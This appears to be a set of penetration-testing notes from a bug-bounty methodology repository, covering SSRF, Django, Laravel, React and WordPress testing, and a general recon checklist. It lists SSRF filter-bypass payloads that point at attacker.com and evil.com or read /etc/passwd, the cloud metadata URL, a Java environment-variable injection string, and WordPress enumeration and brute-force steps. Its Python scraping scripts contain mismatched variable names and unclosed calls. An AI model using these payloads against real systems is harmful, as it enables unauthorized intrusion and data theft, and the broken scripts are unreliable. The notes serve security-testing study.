# Server Site Request Forgery (SSRF)

The flow chart of SSRF goes here:

## Methodology

- Discover functionalities that forces the server to send HTTP requests
- Hidden parameters discovery, then work manually
- Check file uploads for SSRF by SVG (change image content type to `image/svg+xml`)
- PDF generators, HTML and message boxes which turns into something else
- Fuzz every parameter for SSRF (use collaborator Everywhere or auto-repeater)
- URL like parameters, work manually
- pdf generators, the pdf file should be downloaded and be tested with exiftool to find the generator and find exploit for it

## Bypasses, Tricks

Try following methods

- Try to fuzz `subdomains` and `IPs`

```bash
ffuf -w subdomains -u https://sub.domian.tld/page.ext?**SSRFPARAM**=https://**FUZZ**.domain.tld
# put subdomains in the list and check for bypasses (cut -d '.' -f1 -> subdomains.txt)
ffuf -w IPs -u https://sub.domian.tld/page.ext?**SSRFPARAM**=https://**FUZZ**
```

- Fuzz to find something

```bash
fuff -w wc.txt -u https://domain.tld/page.ext?**SSRFPARAM**=https://**FUZZ**.domain.tld
```

- Try to open forbidden URL (403)
- Discover an open redirect, try to chain it with SSRF
- Try a domain pointing to internal IP
- Try these bypasses

```markdown
SSRF bypasses (for protocol):

1.different shemes can be used:
* file:///   --> allow an attacker to fetch the content of a file on the server
== if server suports file we can read file!
# dict://    --> used to refer to world lists available using the dict protocol
* sftp://    --> used for secure file transfer over secure shell
* ldap://    --> Lightweight Directory Access Protocol
* tftp://    --> Trivial Fiel Transfer Protocol, works over udp
# gopher://  --> designed for distributing, searching, and retrieving doc
* http(s):// --> used to fetch any contenf from the web

SSRF bypasses (for url check):
1. it checkts if attacker is not entered internal IP --> (Vulnerable)
==> must not check just IP

* : 127.1 or 0x7F00001--> 127.0.0.1 (use alternatives internal IPs)
* : local.ali.com --> 127.0.0.1 (make a subdomain that points to internal IPs) 
* : [::1] or [::] --> ip version6

2. it checks white list:
* https://company.com --> https://company.com@127.0.0.1

3. it checks if URL starts with http protocol 
* : https://attacker.com --> file:///file/passwd 
==> attacker make an ulr that redirects to another protocol (file)
* : https://attacker.com --> http://127.0.0.1

4. it securly checks domain but one of subdomain has open redirects
* : https://company.com/next?url=https://attacker.com

5. https://user@evil.com@company.com

========================================================================

## Exploitaion: 
 1. reading enternal files (if "file" scheme is allowed)
 ==> sometimes scheme file is not nessecery just /etc/passwd
 2. disclosing origin ip behind CDN
 3. reading cloud meta data 
 ==> every porvider is different(find cloud default ip[169.154.169.154]) 
 4. scanning enternal IPs and Ports

gopherus and ssrfmap are tools:
gopherus
```

```bash
dig a +short ali.fbi.com  #127.0.0.1
```

- Try other IP representative

```
0x7f000001                   #127.0.0.1
127.1                        #127.0.0.1
0.0.0.0                      #127.0.0.1
2130706433                   #127.0.0.1
0                            #127.0.0.1
localtest.me                 #127.0.0.1
my.computer                  #127.0.0.1
ip6-localhost                #127.0.0.1
[0:0:0:0:ffff:127.0.0.1]     #127.0.0.1
 
#java only
url:http://127.0.0.1
url:file:///etc/passwd
```

- Try redirect bypass method to take advantage of various schemes (gopher, dict, file …)
    - URL → check [http(s)] → OK → HTTP Req → Redirects to (gopher:// or file:///)
- Try DNS Rebinding (use [this](https://lock.cmpxchg8b.com/rebinder.html))
    - Domain → Resolution (Google) → ok → HTTP Req → 127.0.0.1

## SVG file

```
**svg-cheatsheet** --> from github (use updatedly) bcz it changes time to time
```

## Post Exploitation

- Check if any useful port is open or not (MYSQL, Redis or etc.)
- Check if any useful scheme is available (Gopher, dict or etc.)
- Check if website is hosted on any cloud service or not (Amazon, Google or etc.)
- You can use Gopherus to exploit …

### Redis - Escalating to RCE

Read write ups

## AWS - Escalating tp RCE

Steps:

1. Gathering the region
2. Gathering the required information
3. Configuring the `awscli`
4. Connecting to API
5. Get accessible instances
6. Executing the command
7. Fetching the results

Determine the region:

```
http://169.254.169.254/latest/dynamic/instance-identity/document
```

… 

…

..


### File: BugHunterMethodology/Methodology/Methodology Flow/Sever Site Template Injection (SSTI).md

# Sever Site Template Injection (SSTI)


### File: BugHunterMethodology/Methodology/Methodology Flow/Technologies and CMS.md

# Technologies and CMS

There are ways when you are facing a product or CMS

- 0day discovery from the core
- Checking for the misconfiguration or vulnerability in third parties

You should decide what’s your plan.

## Checking for the misconfiguration or vulnerability in third parties

you should spend some time to make a methodology for the chosen product

- Install it, check the installation process and work
- Is it run by a traditional web server or modern routing?
- Does it support third parties? How can it be enumerated?
- How the product handles various vulnerabilities?
- Research not only about vulnerability discovery, but also post exploitation
- Read hunters reports to completer your test cases

## Let’s review some cases

[WordPress](Technologies%20and%20CMS/WordPress.md)

[Django](Technologies%20and%20CMS/Django.md)

[Laravel](Technologies%20and%20CMS/Laravel.md)

[React](Technologies%20and%20CMS/React.md)


### File: BugHunterMethodology/Methodology/Methodology Flow/Technologies and CMS/Django.md

# Django

Django is a python-based free and open-source wen framework that follows the model-template-views architectural pattern. it is maintained by the Django Software Foundation, an independent organization established in the US as a 501 non-profit.

## Methodology

- XSS or CRLF discovery on `*.domain.tld` to overwrite the `csrftoken`
- XSS can be handled easily, but it’s possible so test for XSS
- XSS can be occurred in `<a>` and `<form>` or `<iframe>` tags (when the input is reflected there)
- Look for `IDOR`, `SSTI` (old version) and logic based vulnerabilities
- Fuzz to discover endpoint not files or directories
    - If it uses a reverse proxy, there might be an additional path to pointing somewhere else
- Debug mode page discovery
    - Change the host header to something else
    - Sending Request to the 404 page and search for
    - Verb tampering on all pages
    - Send POST request to the `admin/login/?next=/admin/` and searching for 500 Status-Code
- Run an automate scanner like Burp Active Scanner or Acunetix


### File: BugHunterMethodology/Methodology/Methodology Flow/Technologies and CMS/Laravel.md

# Laravel

## Methodology

- XSS or CRLF discovery on `*.domain.tld` to overwrite the CSRF token
- XSS can be handled easily, but it’s possible so test for XSS
- XSS can be occurred in `<a>` and `<iframe>` or `<form>` tags
- `.env` file store sensitive information, but it’s not in public directory (`../.env`)
- Look for IDOR and logic based vulnerabilities
- Laravel uses traditional web server, so fuzz for the files and directories
    - it differs from WordPress, it uses public folders as `document_root`
- GET Request to the `_ignition/heath-check` and search for `can_execute_commands`
- Look if debug mode is enabled or not, verb tamper on different pages
- Use `arrays` instead of `string`, it may result in information disclosure

```python
laravel.test/validateEmail?email[]=
```

- Run an automate scanner like burp Active Scan or Acunetix
- In Laravel ≤ 8.x the X-Forwarded-Host header is allowed an attacker to generate a malicious password-reset Email


### File: BugHunterMethodology/Methodology/Methodology Flow/Technologies and CMS/React.md

# React

Do these bro!

- Check DevTools weather it store something in storage and can we change them?
- Search `path` to all script, Chrome → Source → Search for endpoints (to load UI)
- Can you map the JSs (add `.map` at the end of .js files)


### File: BugHunterMethodology/Methodology/Methodology Flow/Technologies and CMS/WordPress.md

# WordPress

WordPress is a free and open-source content management system written in PHP and paired with a MySQL or MariaDB database. Features including a plugin architecture and template system, referred to within WordPress as Themes. 

## Methodology

- Recommend
    - Try to register with `@company.tld` email in `/wp-register.php`
    - Extract important files in WordPress (buckup fuzz)
    - File and directory files such as `.env`
    - Plugin and Theme enumeration → look for the vulnerabilities
    - Run an automate scanner like Burp Active Scan or Acunetix
- `license.txt` contains useful information such as the version WordPress installed.
- `wp-activate.php` is useful for the email activation process when setting up a new WordPress site.
- `xmlrpc.php` should be checked ( POST method )
- `wp-content/uploads` for directory listing and should be checked
- `wp-config.php` file contains top creds database stuff should be looked for backups

### Get WordPress Version

- meta tags name=”generator” ‘`content=WordPress’`

```bash
curl https://taget.com/ | grep 'content="WordPress'
```

- CSS link show the version and `js` files
- `wp-cron.php` for `DoS`
- `wp-json/oembed/1.0/proxy?url=COLOBURETOR` ( when 401 is found, it did not work )
- Yashar does not do (we can do)
    - WordPress user enumeration → Brute force
        - `/wp-json/wp/v2/users`
        - `/?author=1`
    - Brute force user accounts

### Fuzzing the plugins

Fuzzing plugins are helpful and they can help us to look for the found vulnerabilities in the plugins and also help us to manually work on the templates and search for the 0days

New plugins daily come to the WordPress websites and if we want to find the most plugins in target we should keep updating or wordlist.

To getting the latest version wordlist. Yashar made a script.

```python
from bs4 import BeautifulSoup
import urllib.request as hyperlink
import os

link = hyperlink.urlopen('http://plugins.svn.wordpress.org/')
wordPressSoup = BeautifulSoup(link,'lxml')
filePate = os.path.dirname(os.path.realpath(__file__))
fileNaming = (filePath + ('scrapedlist.txt'))
print('The current working directory of the files is ' + filePath + ' the scraped list has been saved to this directory as scrapedlist.txt')
with open('scrapedlist.txt','wt',encoding='utf8') as file:
	for link in wordPressSoup.find_all('a', href=True):
		lng = link.get('href')
		file.write(lnk.replace("/", "") + '\n')
		print(lnk.replace("/", "")
```

Fuzzing Themes

Like fuzzing plugins phase I wrote a script to get the latest themes slugs.

```python
from bs4 import BeautifulSoup
import urllib.request as hyperlink
import os

link = hyperlink.urlopen('http://themes.svn.wordpress.org/')
wordPressSoup = BeautifulSoup(link,'lxml')
filePate = os.path.dirname(os.path.realpath(__file__))
fileNaming = (filePath + ('scrapedlist.txt'))
print('The current working directory of the files is ' + filePath + ' the scraped list has been saved to this directory as scrapedlist.txt')
with open('scrapedlist.txt','wt',encoding='utf8') as file:
	for link in wordPressSoup.find_all('a', href=True):
		lng = link.get('href')
		file.write(lnk.replace("/", "") + '\n')
		print(lnk.replace("/", "")
```

## To fuzz:

```python
ffuf -w scraped -u http://url.tld/wp-content/plugins/FUZZ
```


### File: BugHunterMethodology/Methodology/Methodology Flow/What to do.md

# What to do?

Apply all this in any asset

- Web application recon
    - Browse the website (spend most of your time)
    - Path discovery
    - parameter discovery (in POST also `-X POST —as-body`)
    - Passive search (google, achieve …)
    - Fuzz wisely
    - Request header discovery (fuzz for unknown headers)
- Perform technology and CMS based on them test
- Perform the authentication class tests manually
- Look for the reflections
- Active scan HTTP request selectively (burp manually)
- Use verb tamper EVERYWHERE, specially in endpoints
- Change content type of the requests, `URL-Encoded` to `XML` and `JSON`or vice versa
- Look for the business logic flaws, there is no specific pattern
- Look for the update operations, conduct race condition attack
- To find SQLI, use `sqlmap` and set the technology to time based
- In Java web app, try `1${T(java.lang.System).getenv()}`
- Java script analysis

### Third Party Application

- How to detect them?
    - Looking up Page’s title
    - Looking for words like `Powered by x`, `Designed by y`, `Copyright all rights reserved`
    - Check response Headers
    - use wappalyzer
    - google is my friend (use it always)
- How to hunt for vulnerabilities?
    - Always check for CVEs and exploit the hole
    - Check default credentials
    - Look up the app’s name in bug bounty platforms
    - Look up app’s name on Twitter, Reddit ,etc.
    - Fuzz default app’s path

### Facing 301,302,307

- Fuzz directories and files to discover a juicy URL
- See source code
- Fuzz to discover hidden parameter (Always there)

### Facing 401/403

- Use Archives and google dorks
- **Recursively** fuzz to find a directory

```
site/forbidden             #403
site/forbidden/dir1        #403
site/forbidden/dir1/dir2   #200
```

- Fuzz directories and files to bypass restrictions
- Put extra header to bypass
- Brute force 401 for default credentials (use small and default)
- Try IIS short-name scanner on windows
- Watch it for changes

### Facing 404 or 5xx

- Fuzz directories and files to discover a juicy url
- Watch the changes


### File: BugHunterMethodology/Methodology/Methodology Flow/XXE.md

# XXE

- You have `docx`, `xlxs`, `pptx` upload files → extract them and inject payloads
    - word/document.xml, ppt/presentation.xml, xl/workbook.xml
-
